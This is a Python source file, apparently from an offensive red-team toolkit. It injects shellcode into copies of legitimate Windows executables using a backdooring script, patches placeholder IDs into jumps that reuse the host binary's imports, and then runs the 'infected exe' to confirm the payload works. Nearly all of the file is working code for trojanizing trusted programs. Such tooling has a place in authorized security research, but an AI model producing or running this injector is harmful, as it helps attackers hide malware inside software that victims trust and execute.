from helper import *
import shutil
import pprint
import logging
import time

from pehelper import *
from model import *
from project import project

logger = logging.getLogger("Injector")


def inject_exe(
    shellcode_in: FilePath,
    exe_in: FilePath,
    exe_out: FilePath,
    exe_capabilities: ExeCapabilities,
):
    logger.info("--[ Injecting: {} into: {} -> {} ".format(
        shellcode_in, exe_in, exe_out
    ))

    # create copy of file exe_in to exe_out
    shutil.copyfile(exe_in, exe_out)

    # inject shellcode into exe_out with redbackdoorer
    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
    run_process_checkret([
        "python3.exe",
        "redbackdoorer.py",
        project.inject_mode,
        shellcode_in,
        exe_out
    ])

    # replace IAT in shellcode in code
    # and re-implant it
    if project.source_style == SourceStyle.iat_reuse:
        # get code section of exe_out
        code = extract_code_from_exe(exe_out)
        for cap in exe_capabilities.get_all().values():
            if not cap.id in code:
                raise Exception("Capability ID {} not found, abort".format(cap.id))
            
            off = code.index(cap.id)
            current_address = off + exe_capabilities.image_base + exe_capabilities.text_virtaddr
            destination_address = cap.addr
            logger.info("    Replace at 0x{:x} with call to 0x{:x}".format(
                current_address, destination_address
            ))
            jmp = assemble_and_disassemble_jump(
                current_address, destination_address
            )
            code = code.replace(cap.id, jmp)

        # write back our patched code into the exe
        write_code_section(exe_file=exe_out, new_data=code)

     
def verify_injected_exe(exefile: FilePath):
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(project.verify_filename).unlink(missing_ok=True)

    run_process_checkret([
        exefile,
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(project.verify_filename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(project.verify_filename)
        return True
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return False

